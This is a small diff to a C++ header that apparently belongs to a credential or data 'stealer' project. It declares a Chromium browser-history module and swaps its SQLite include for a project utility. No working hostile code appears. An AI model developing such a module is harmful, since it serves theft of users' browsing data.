@@ -6,8 +6,8 @@
 #define STEALER_CHISTORY_H
 
 
-#include "sqlite3.h"
 #include "../ChromiumBrowserModule.h"
+#include "../../../../../utils/SQLiteUtil.h"
 
 class CHistory : public ChromiumBrowserModule {
 public:
